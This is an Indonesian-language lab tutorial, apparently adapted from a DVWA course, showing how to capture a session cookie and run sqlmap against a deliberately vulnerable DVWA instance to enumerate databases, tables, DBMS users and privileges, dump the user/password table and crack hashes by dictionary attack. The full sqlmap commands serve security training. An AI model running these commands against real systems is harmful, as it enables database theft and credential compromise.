### **Automate SQL Injection with SqlMap**

* Apa itu SQL Injection?
  * SQL injection adalah teknik yang sering digunakan untuk menyerang aplikasi berbasis data.
  * Teknik ini dilakukan dengan menyisipkan sebagian statemen SQL ke dalam field dalam sebuat website untuk menjalankan perintah ke dalam database. SQL Injection adalah teknik yang memanfaatkan kelemahan keamanan dalam software aplikasi. 
* Apa itu sqlmap?
  * Sqlmap adalah alat penetration test open source yang mengotomati proses pendeteksian dan mengeksploitasi SQL injection dan mengambil alih database server. 
* Lab Notes
  * Dalam lesson ini akan dilakukan:
    1. Penggunaan sqlmap untuk mendapatkan informasi:
       1. Daftar username dan password manajemen database
       2. Daftar database
       3. Daftar tabel dalam database tertentu
       4. Daftar usernam dan password dalam tabel database tertentu

| **Section 1: Login ke dalam DVWA** |
| :--- |


1. Buka browser

2. Login ke DVWA

   * Langkah**:**
     1. Buka firefox
     2. Masukkan ip metasploitable, contoh: [http://192.168.56.102/dvwa/login.php](http://192.168.56.102/dvwa/login.php).
     3. Login: admin
     4. Password: password
     5. Klik Login
   * ![](/assets/0. Login.PNG)

| **Section 2: Tetapkan Tingkat Keamanan** |
| :--- |


1. Tetapkan tingkat keamanan DVWA

   * Langkah**:**  
     1. Klik bagian DVWA Security di menu bagian kiri.  
     2. Pilih "low"  
     3. Klik Submit

   * ![](/assets/0. Security.PNG)

| **Section 3: Mendapatkan PHP Cookie** |
| :--- |


1. SQL Injection Menu

   * **Langkah:**
     1. Pilih "SQL Injection" dari menu bagian kiri.
   * ![](/assets/0.1. sql injection .PNG)

2. Pilih Tamper Data \(Jika belum ada add-ons nya , instal terlebih dahulu\)

   * **Langkah:**
     1. Tools --&gt; Tamper Data
   * ![](/assets/Tamper data.PNG)

3. Start Tamper Data

   * **Langkat:**  
     1. Buka halaman sql injection \(pilih pada menu bagian kiri\)  
     2. Klik Start Tamper pada bagian atas kiri

   * ![](/assets/Start tamper.PNG)

4. Basic Injection

   * **Langkah:**  
     1. Masukkan "1" ke text box.  
     2. Klik Submit.

   * ![](/assets/1. Manual injection.PNG)

5. Tamper with request?

   * **Langkah:**  
     1. Pastikan kotak "Continue Tampering?" tidak dicentang.  
     2. Klik Submit

   * ![](/assets/Continue tamper.PNG)

6. Copy Referer URL

   * **Langkah:**  
     1. Pilih GET Request kedua  
     2. Klik kanan Referer Link  
     3. Pilih Copy

   * ![](/assets/Referer.PNG)

7. Buka Notepad

8. Paste Referer URL ke Notepad

9. Copy Cookie Information

   * **Langkah:**  
     1. Right Click on the Cookie line  
     2. Select Copy

   * ![](/assets/Cookie.PNG)

10. Paste Cookie Information ke notepad

| **Section 4: Mendapatkan Current User dan Database Menggunakan SqlMap** |
| :--- |


1. Pastikan sqlmap berjalan

   * **Langkah:**  
     1. Buka terminal  
     2. Tulis perintah:

     ```
        sqlmap
     ```

   * ![](/assets/sqlmap.PNG)

2. Mendapatkan user database DVWA

   * **Langkah:**  
     1. Masukkan perintah sesuai dengan data yang didapat dari langkah sebelumnya:

     ```
        sqlmap -u <referal url> --cookie=<cookie> -b --current-db --current-user
     ```

     * -u, Target URL
     * --cookie, HTTP Cookie header
     * -b, Retrieve DBMS banner
     * --current-db, Retrieve DBMS current database
     * --current-user, Retrieve DBMS current user

   * ![](/assets/sqlmap 1.PNG)

3. Hasil sqlmap

   * Akan terlihat current-user dan current-database
   * ![](/assets/hasil sqlmap.PNG)

| **Section 5: Menggunakan SqlMap untuk Mendapatkan Username dan Password Database Management** |
| :--- |


1.Mendapatkan username dan password Database Management

* **Langkah:**

1.Masukkan perintah dibawah:

```
sqlmap -u "
http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" --string="Surname" --users --password
```

o ![](/assets/sqlmap 3.PNG)

2.Mendapatkan Username dan Password Database Management \(Bagian 2\)

o**Langkah:**

0.Use Dictionary Attack? Y

1.Dictionary Location? &lt;Tekan enter&gt;

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.101.jpg")

3.Mendapatkan Privileges database db\_hacker

o**Langkah:**

0../sqlmap.py -u "[http://\*\*192.168.56.102\*\*/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit](http://**192.168.56.102**/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=**lpb5g4uss9kp70p8jccjeks621**; security=low" -U db\_hacker --privileges

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image003.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.103.jpg")

4.Menampilkan hasil

o**Langkah:**

0.Notice that DBMS user "db\_hacker" has administrative privileges

1.Notice that "db\_hacker" can log in from anywhere, via the "%" wildcard operator.

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.104.jpg")

| **Section 6: Mendapatkan daftar database yang ada** |
| :--- |


1.Mendapatkan daftar database yang ada

o **Langkah:**

1. Masukkan perintah dibawah :
   ```
   sqlmap.py -u "
   http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
   " --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" --dbs
   ```

o ![](/assets/sqlmap 5.PNG)

2.Melihat hasil

o![](/assets/sqlmap 6.PNG)

| **Section 7: Mendapatkan isi table “dvwa”** |
| :--- |


1.Mendapatkan isi table “dvwa”

o**Langkah:**

1../sqlmap.py -u "[http://\*\*192.168.56.102\*\*/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit](http://**192.168.56.102**/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=**lpb5g4uss9kp70p8jccjeks621**; security=low" -D dvwa --tables

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image007.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.91.jpg")

2.Melihat hasil

o**Notes\(FYI\):**

1.Notice sqlmap listed two tables: guestbook and users.

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.92.jpg")

3.Mendapatkan kolom dari table dvwa.users

o**Langkah:**

1../sqlmap.py -u "[http://\*\*192.168.56.102\*\*/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit](http://**192.168.56.102**/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=**lpb5g4uss9kp70p8jccjeks621**; security=low" -D dvwa -T users --columns

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image009.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.93.jpg")

4.Melihat hasil

o**Notes\(FYI\):**

1.Notice that there are both a user and password columns in the dvwa.users table.

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.94.jpg")

5.Mendapatkan user dan password dari tabel dvwa.users \(Bagian 1\)

o**Langkah:**

1../sqlmap.py -u "[http://\*\*192.168.56.102\*\*/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit](http://**192.168.56.102**/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=**lpb5g4uss9kp70p8jccjeks621**; security=low" -D dvwa -T users -C user,password --dump

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image011.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.95.jpg")

6.Mendapatkan user dan password dari tabel dvwa.users \(Bagian 2\)

o**Langkah:**

1.Do you want to use the LIKE operator? Y

2.Recognize possible HASH values? Y

3.What's the dictionary location? &lt;Tekan Enter&gt;

4.Use common password suffixes? y

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.96.jpg")

7.Melihat hasil

o**Notes\(FYI\):**

1.Notice how sqlmap nicely displays passwords for each user.

o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image013.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.97.jpg")

| **Section 8: Menggunakan john the ripper** |
| :--- |


1.Proof of Lab

o**Instructions:**

1.Bring up a new terminal, see \(Section 7, Step 1\)

2.cd /pentest/database/sqlmap

3.find output/\* -print \| xargs ls -l

4.date

5.echo "Your Name"

§Replace the string "Your Name" with your actual name.

§e.g., echo "John Gray"

o**Proof of Lab Instructions:**

1.Do a &lt;PrtScn&gt;

2.Paste into a word document

3.Upload to Moodle

o

